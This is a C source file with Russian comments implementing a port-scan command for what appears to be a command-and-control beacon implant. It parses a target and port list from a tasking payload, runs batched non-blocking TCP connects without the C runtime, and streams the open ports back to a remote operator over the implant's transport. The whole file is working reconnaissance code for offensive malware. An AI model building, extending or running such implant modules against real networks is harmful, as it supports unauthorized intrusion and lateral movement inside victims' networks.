// cmd_portscan.c — TCP connect scan без CRT.
//
// Синтаксис: portscan <target> [ports]
//   target  — IP-адрес или hostname
//   ports   — "22,80,443"  или  "1-1024"  или  "22,100-200,443"
//             Если не указан — сканируются ~30 самых распространённых портов.
//
// Метод: неблокирующий WSASocket + connect + select с таймаутом TIMEOUT_MS.
// Сканирует батчами по SCAN_BATCH сокетов одновременно.
// Выводит только открытые порты + итоговую строку.

#include <winsock2.h>
#include <ws2tcpip.h>
#include "../core/beacon.h"

#define TIMEOUT_MS   500    // таймаут ожидания connect на один батч
#define SCAN_BATCH    60    // сокетов за раз (FD_SETSIZE=64, оставляем запас)

// Таблица имён сервисов — только самые распространённые.
static const struct { WORD port; const char* name; } kSvc[] = {
    {21,   "ftp"},       {22,   "ssh"},       {23,   "telnet"},
    {25,   "smtp"},      {53,   "dns"},       {80,   "http"},
    {110,  "pop3"},      {111,  "sunrpc"},    {135,  "msrpc"},
    {139,  "netbios-ssn"},{143, "imap"},      {389,  "ldap"},
    {443,  "https"},     {445,  "microsoft-ds"},{636, "ldaps"},
    {993,  "imaps"},     {995,  "pop3s"},     {1433, "ms-sql-s"},
    {1723, "pptp"},      {3306, "mysql"},     {3389, "ms-wbt-server"},
    {5985, "winrm-http"},{5986, "winrm-https"},{5900,"vnc"},
    {8080, "http-proxy"},{8443, "https-alt"}, {9090, "http-alt"},
    {27017,"mongodb"},   {6379, "redis"},     {2049, "nfs"},
    {0,    NULL}
};

// Топ-30 портов для сканирования по умолчанию.
static const WORD kDefaultPorts[] = {
    21,22,23,25,53,80,110,111,135,139,
    143,389,443,445,636,993,995,1433,1723,2049,
    3306,3389,5900,5985,5986,8080,8443,9090,27017,6379
};
#define kDefaultPortsCount (sizeof(kDefaultPorts)/sizeof(kDefaultPorts[0]))

// ---- Вспомогательные функции (без CRT) ------------------------------------

// Парсит беззнаковое число из строки и двигает указатель.
static UINT32 parse_u32(const char** p) {
    UINT32 n = 0;
    while (**p >= '0' && **p <= '9') {
        n = n * 10u + (UINT32)(**p - '0');
        (*p)++;
    }
    return n;
}

// Возвращает имя сервиса для порта или пустую строку.
static const char* svc_name(WORD port) {
    for (int i = 0; kSvc[i].name; i++)
        if (kSvc[i].port == port) return kSvc[i].name;
    return "";
}

// Записывает n как десятичное число в buf. Возвращает кол-во символов.
static int u32_dec(UINT32 n, char* buf) {
    if (n == 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int l = 0;
    while (n) { tmp[l++] = (char)('0' + n % 10); n /= 10; }
    for (int i = 0; i < l; i++) buf[i] = tmp[l - 1 - i];
    return l;
}

// out_write строкового литерала.
#define ow(s) out_write((s), sizeof(s) - 1)

// out_write целого числа.
static void ow_u32(UINT32 n) {
    char b[12]; out_write(b, (size_t)u32_dec(n, b));
}

// Дописывает пробелы до нужной ширины.
static void ow_pad(int written, int width) {
    static const char sp[] = "          "; // 10 пробелов
    int need = width - written;
    if (need > 0 && need <= 10) out_write(sp, (size_t)need);
    else if (need > 10)         out_write(sp, 10);
}

// Печатает строку таблицы для открытого порта.
static void print_open(WORD port) {
    // Формат: "22/tcp    open      ssh\n"
    char pbuf[12];
    int plen = u32_dec(port, pbuf);
    out_write(pbuf, (size_t)plen);
    ow("/tcp");
    ow_pad(plen + 4, 10);
    ow("open");
    ow_pad(4, 10);
    const char* svc = svc_name(port);
    if (*svc) out_write(svc, rt_strlen(svc));
    ow("\n");
}

// ---- Основная функция -----------------------------------------------------

void cmd_portscan(const BeaconTask* t) {
    char target[256]     = {0};
    char ports_spec[2048] = {0};

    kv_get_str(t->pay, t->pay_len, "target", target, sizeof(target));
    kv_get_str(t->pay, t->pay_len, "ports",  ports_spec, sizeof(ports_spec));

    if (!target[0]) {
        ow("[!] portscan: no target\n");
        return;
    }

    // Выделяем массив портов для сканирования (макс. 65535).
    WORD* ports = (WORD*)bmalloc(65535u * sizeof(WORD));
    if (!ports) { ow("[!] portscan: out of memory\n"); return; }
    DWORD port_count = 0;

    if (!ports_spec[0]) {
        // Список по умолчанию.
        for (DWORD i = 0; i < kDefaultPortsCount; i++)
            ports[port_count++] = kDefaultPorts[i];
    } else {
        // Парсим пользовательский список: "22,80,100-200,443"
        const char* p = ports_spec;
        while (*p && port_count < 65535u) {
            while (*p == ' ' || *p == ',') p++;
            if (!*p) break;
            UINT32 a = parse_u32(&p);
            if (*p == '-') {
                p++;
                UINT32 b = parse_u32(&p);
                if (b < a) { UINT32 tmp = a; a = b; b = tmp; }
                if (b > 65535) b = 65535;
                for (UINT32 pp = a; pp <= b && port_count < 65535u; pp++)
                    ports[port_count++] = (WORD)pp;
            } else {
                if (a && a <= 65535) ports[port_count++] = (WORD)a;
            }
        }
    }

    if (port_count == 0) {
        ow("[!] portscan: no valid ports\n");
        bfree(ports);
        return;
    }

    // Инициализация Winsock.
    WSADATA wsd;
    if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        ow("[!] portscan: WSAStartup failed\n");
        bfree(ports);
        return;
    }

    // Разрешаем hostname → IPv4.
    struct addrinfo hints, *res = NULL;
    rt_memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(target, NULL, &hints, &res) != 0 || !res) {
        ow("[!] portscan: cannot resolve ");
        out_write(target, rt_strlen(target));
        ow("\n");
        WSACleanup();
        bfree(ports);
        return;
    }

    struct sockaddr_in base_sa;
    rt_memcpy(&base_sa, res->ai_addr, sizeof(base_sa));
    freeaddrinfo(res);

    // Транспорт нужен для промежуточных flush'ей (аналог cmd_download/cmd_screenshot).
    const TransportVtbl* tv = get_transport();

    // Заголовок таблицы — шлём сразу, не ждём окончания сканирования.
    ow("PORT      STATE     SERVICE\n");
    ow("--------- --------- -------\n");
    out_flush_chunk(tv, 0);

    DWORD t0         = GetTickCount();
    DWORD open_count = 0;

    // Массивы для текущего батча.
    SOCKET socks[SCAN_BATCH];
    WORD   sport[SCAN_BATCH];

    for (DWORD base = 0; base < port_count; base += SCAN_BATCH) {
        DWORD batch  = port_count - base;
        if (batch > SCAN_BATCH) batch = SCAN_BATCH;

        // Открываем неблокирующие сокеты и запускаем connect.
        DWORD actual = 0;
        for (DWORD i = 0; i < batch; i++) {
            SOCKET s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                                  NULL, 0, WSA_FLAG_OVERLAPPED);
            if (s == INVALID_SOCKET) continue;

            u_long nb = 1;
            ioctlsocket(s, FIONBIO, &nb);

            struct sockaddr_in sa;
            rt_memcpy(&sa, &base_sa, sizeof(sa));
            sa.sin_port = htons(sport[actual] = ports[base + i]);

            // connect на неблокирующем сокете вернёт WSAEWOULDBLOCK — это норма.
            connect(s, (struct sockaddr*)&sa, sizeof(sa));

            socks[actual++] = s;
        }

        if (!actual) continue;

        // select: ждём TIMEOUT_MS мс до завершения соединений.
        fd_set wset, eset;
        FD_ZERO(&wset);
        FD_ZERO(&eset);
        for (DWORD i = 0; i < actual; i++) {
            FD_SET(socks[i], &wset);
            FD_SET(socks[i], &eset);
        }
        struct timeval tval;
        tval.tv_sec  = TIMEOUT_MS / 1000;
        tval.tv_usec = (TIMEOUT_MS % 1000) * 1000;
        select(0, NULL, &wset, &eset, &tval);

        // Проверяем результаты.
        DWORD batch_open = 0;
        for (DWORD i = 0; i < actual; i++) {
            if (FD_ISSET(socks[i], &wset)) {
                // Дополнительно проверяем SO_ERROR — на некоторых стеках
                // сокет попадает в write-set даже при ошибке.
                int so_err = 0; int elen = sizeof(so_err);
                getsockopt(socks[i], SOL_SOCKET, SO_ERROR,
                           (char*)&so_err, &elen);
                if (so_err == 0) {
                    print_open(sport[i]);
                    open_count++;
                    batch_open++;
                }
            }
            closesocket(socks[i]);
        }

        // Флашим результаты батча сразу — оператор видит порты по мере сканирования,
        // не дожидаясь окончания всего скана. Пустые батчи (batch_open==0) тоже
        // флашим раз в N батчей чтобы показать прогресс при длинных диапазонах.
        if (batch_open > 0 || (base % (SCAN_BATCH * 8u)) == 0)
            out_flush_chunk(tv, 0);
    }

    bfree(ports);
    WSACleanup();

    // Итоговая строка.
    DWORD elapsed = GetTickCount() - t0;
    ow("\nScan of ");
    out_write(target, rt_strlen(target));
    ow(": ");
    ow_u32(open_count);
    ow(" open port(s), ");
    ow_u32(port_count);
    ow(" scanned (");
    // Выводим время в формате X.XXXs.
    ow_u32(elapsed / 1000u);
    ow(".");
    char ms[3];
    DWORD r = elapsed % 1000u;
    ms[0] = (char)('0' + r / 100u);
    ms[1] = (char)('0' + (r / 10u) % 10u);
    ms[2] = (char)('0' + r % 10u);
    out_write(ms, 3);
    ow("s)\n");

    // Финальный кадр (is_last=1) — подавляет пустой out_flush_via_transport в cmd_dispatch.
    out_flush_chunk(tv, 1);
}
